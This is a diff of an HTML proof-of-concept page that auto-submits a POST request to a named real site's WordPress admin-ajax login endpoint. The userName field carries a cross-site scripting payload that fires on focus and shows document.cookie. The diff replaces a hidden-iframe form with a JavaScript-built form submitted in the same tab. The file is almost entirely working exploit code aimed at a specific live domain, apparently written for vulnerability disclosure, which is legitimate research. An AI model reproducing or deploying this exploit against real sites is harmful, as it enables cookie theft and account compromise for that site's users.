@@ -1,20 +1,37 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>PoC Auto-POST XSS</title>
-  </head>
-  <body>
-    <form id="xssForm" method="POST" action="https://airtel-advantage.airtel.in/wp-admin/admin-ajax.php" target="xssFrame">
-      <input type="hidden" name="action" value="login_request">
-      <input type="hidden" name="userName" value='test@test.com <input autofocus onfocus=alert(document.cookie)>'>
-      <input type="hidden" name="password" value="123123123123">
-      <input type="hidden" name="fp" value="2801283074">
-    </form>
+<head>
+  <title>XSS PoC Redirect</title>
+</head>
+<body>
+  <script>
+    // Create the form element
+    const form = document.createElement('form');
+    form.method = 'POST';
+    form.action = 'https://airtel-advantage.airtel.in/wp-admin/admin-ajax.php';
+    form.target = '_self'; // submit in same tab
 
-    <iframe name="xssFrame" style="display:none;"></iframe>
+    // Payload in userName
+    const payload = `test@test.com <input autofocus onfocus=alert(document.cookie)>`;
 
-    <script>
-      document.getElementById('xssForm').submit();
-    </script>
-  </body>
+    // Add parameters
+    const params = {
+      action: 'login_request',
+      userName: payload,
+      password: '123123123123',
+      fp: '2801283074'
+    };
+
+    for (const key in params) {
+      const input = document.createElement('input');
+      input.type = 'hidden';
+      input.name = key;
+      input.value = params[key];
+      form.appendChild(input);
+    }
+
+    document.body.appendChild(form);
+    form.submit();
+  </script>
+</body>
 </html>
